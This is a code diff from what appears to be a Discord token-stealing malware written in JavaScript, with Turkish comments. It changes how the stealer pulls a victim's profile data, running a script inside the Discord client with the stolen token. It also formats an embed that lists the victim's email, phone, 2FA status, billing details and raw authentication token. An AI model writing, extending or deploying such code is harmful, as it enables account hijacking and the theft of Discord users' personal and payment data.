@@ -263,19 +263,22 @@ async function buildUserInfo(token) {
     ]);
     if (!user || user.message) return null;
 
-    // Profile — boost süresi ve badge'ler için, paralel çek
-    let profile = null;
+    // Profile — renderer üzerinden çağır (Discord'un kendi session'ı, CORS/auth sorunu yok)
     try {
-        profile = await apiGet(
-            `https://discord.com/api/v9/users/${user.id}/profile?with_mutual_guilds=false`,
-            token
-        );
-    } catch {}
-
-    if (profile && !profile.message) {
-        if (profile.premium_guild_since) user.premium_guild_since = profile.premium_guild_since;
-        user._profile_badges = Array.isArray(profile.badges) ? profile.badges : [];
-    } else {
+        const profileJson = await execScript(`(function(){
+            var x = new XMLHttpRequest();
+            x.open("GET", "https://discord.com/api/v9/users/${user.id}/profile?with_mutual_guilds=false", false);
+            x.setRequestHeader("Authorization", ${JSON.stringify(token)});
+            x.send(null);
+            try { return JSON.parse(x.responseText); } catch(e) { return null; }
+        })()`);
+        if (profileJson && !profileJson.message) {
+            if (profileJson.premium_guild_since) user.premium_guild_since = profileJson.premium_guild_since;
+            user._profile_badges = Array.isArray(profileJson.badges) ? profileJson.badges : [];
+        } else {
+            user._profile_badges = [];
+        }
+    } catch {
         user._profile_badges = [];
     }
 
@@ -288,14 +291,14 @@ async function buildUserInfo(token) {
 
 function buildFields(user, billing, friends, token, extra) {
     const fields = [
-        { name: '👤 Username', value: `\`${user.username}\``,            inline: true  },
-        { name: '🆔 ID',       value: `\`${user.id}\``,                  inline: true  },
-        { name: '📧 Email',    value: `\`${user.email    || 'N/A'}\``,   inline: true  },
-        { name: '📱 Phone',    value: `\`${user.phone    || 'N/A'}\``,   inline: true  },
-        { name: '🔒 2FA',      value: user.mfa_enabled ? '✅' : '❌',    inline: true  },
-        { name: '💎 Nitro',    value: getNitro(user),                    inline: true  },
-        { name: '💳 Billing',  value: parseBilling(billing),             inline: true  },
-        { name: '🏅 Badges',   value: getBadges(user),                   inline: false },
+        { name: '👤 Username', value: `\`${user.username}\``,            inline: true },
+        { name: '🆔 ID',       value: `\`${user.id}\``,                  inline: true },
+        { name: '📧 Email',    value: `\`${user.email    || 'N/A'}\``,   inline: true },
+        { name: '📱 Phone',    value: `\`${user.phone    || 'N/A'}\``,   inline: true },
+        { name: '🔒 2FA',      value: user.mfa_enabled ? '✅' : '❌',    inline: true },
+        { name: '💎 Nitro',    value: getNitro(user),                    inline: true },
+        { name: '💳 Billing',  value: parseBilling(billing),             inline: true },
+        { name: '🏅 Badges',   value: getBadges(user),                   inline: true },
         ...(extra || []),
         { name: '🔑 Token',    value: `\`${token}\``,                    inline: false },
     ];
